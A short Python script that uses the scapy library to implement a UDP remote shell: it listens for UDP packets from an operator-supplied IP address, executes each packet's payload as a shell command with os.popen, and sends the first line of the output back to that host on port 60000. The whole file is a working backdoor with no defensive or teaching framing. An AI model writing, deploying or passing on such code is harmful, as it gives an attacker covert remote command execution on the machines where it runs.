# -*- coding: utf-8 -*-
from scapy.all import IP,UDP,Raw,sr1,sniff
import os
import argparse
import argparse
TTL = int(60)
parser = argparse.ArgumentParser()
parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
args = parser.parse_args()
def udpshell(pkt):
    if pkt[Raw].load and pkt[IP].src == args.destination_ip:
        udppacket = (pkt[Raw].load).decode('utf-8', errors= 'ignore')
        payload = os.popen(udppacket).readline()
        udppaket = (IP(dst=args.destination_ip,ttl=TTL)/UDP(sport=53555, dport=60000,)/Raw(load=payload))
        sr1(udppaket,timeout=0,verbose= 0)
    else:
        pass




print('[+]UDP Listener')
sniff( prn=udpshell, filter="udp", store="0")